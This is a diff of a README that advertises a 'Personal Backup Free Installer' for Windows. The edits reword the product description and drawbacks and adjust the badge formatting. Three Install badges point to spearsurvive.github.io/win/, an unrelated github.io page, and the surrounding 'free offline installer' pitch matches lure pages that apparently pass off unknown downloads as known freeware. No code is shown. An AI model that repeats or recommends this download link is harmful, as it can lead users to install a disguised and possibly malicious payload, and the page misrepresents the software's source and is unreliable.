@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Backup+Software-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Personal Backup Free Installer** — Personal Backup is a free Windows backup software for creating scheduled backups of files and folders to local drives, NAS, or FTP servers. Works without internet access, no account required. Full offline installation.
+**💻 Personal Backup Free Installer** — Personal Backup is a free backup utility for Windows that supports creating compressed, encrypted backups to local drives, network shares, or FTP servers. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal%20Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal+Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Personal Backup
 
-Personal Backup is a free Windows backup software for creating scheduled backups of files and folders to local drives, NAS, or FTP servers. It supports versioning, compression, encryption, and verification of backup integrity.
+Personal Backup is a free backup utility for Windows that supports creating compressed, encrypted backups to local drives, network shares, or FTP servers. Configure backup plans with flexible scheduling, version control, and pre/post-backup scripts. With a portable mode and detailed backup logs, Personal Backup is a reliable solution for personal and small business file protection.
 
 ---
 
 ## ❌ Problem: Personal Backup is hard to access
 
-- **Windows Only** — Not available on macOS or Linux
-- **German Software** — Primary documentation and interface in German; English translation available
-- **Complex Configuration** — Advanced backup strategies require careful setup
-- **No Bare-Metal** — File-level backup only; system image backup not included
+- **Windows Only** — No cross-platform support
+- **Interface Complexity** — Many configuration options can overwhelm new users
+- **No Cloud Native** — Cloud backup requires manual FTP or network setup
+- **Development Pace** — Updates less frequent than commercial alternatives
 
 ---
 
@@ -81,7 +81,7 @@ Personal Backup is a free Windows backup software for creating scheduled backups
 
 <div align="center">
 
-[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal%20Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal+Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Personal Backup is a free Windows backup software for creating scheduled backups
 
 ---
 
-**Personal Backup Free Installer** — Personal Backup is a free Windows backup software for creating scheduled backups of files and folders to local drives, NAS, or FTP servers. Install without internet connection today!
+**Personal Backup Free Installer** — Personal Backup is a free backup utility for Windows that supports creating compressed, encrypted backups to local drives, network shares, or FTP servers. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal%20Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Personal Backup](https://img.shields.io/badge/⬇_Install_Personal+Backup-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
